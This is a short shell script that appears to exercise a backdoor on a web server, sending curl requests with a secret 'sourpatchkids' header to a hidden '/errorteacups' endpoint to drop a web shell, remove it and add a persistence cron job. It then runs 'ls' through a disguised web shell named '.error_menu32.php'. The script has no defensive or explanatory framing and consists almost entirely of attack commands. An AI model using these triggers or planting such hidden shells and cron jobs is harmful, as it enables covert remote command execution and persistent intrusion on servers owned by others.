echo -e "[============================================================================================================]\n"
echo "Testing shell....";

sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=shell

echo -e "[============================================================================================================]\n\n\n"



echo -e "[============================================================================================================]\n"

echo "Removing Shell...";

sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=clean

echo -e "[============================================================================================================]\n\n\n"



echo -e "[============================================================================================================]\n"

echo "Adding cronjob...";

sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=cronjob

echo -e "\n\n[============================================================================================================]\n\n\n"


echo -e "[============================================================================================================]\n"

echo "Testing cmd"

sudo curl -H "sourpatchkids: sourpatchkids" http://localhost/errorteacups?url=shell

sudo curl http://localhost/.error_menu32.php?cmd=ls

echo -e "[============================================================================================================]\n\n\n"
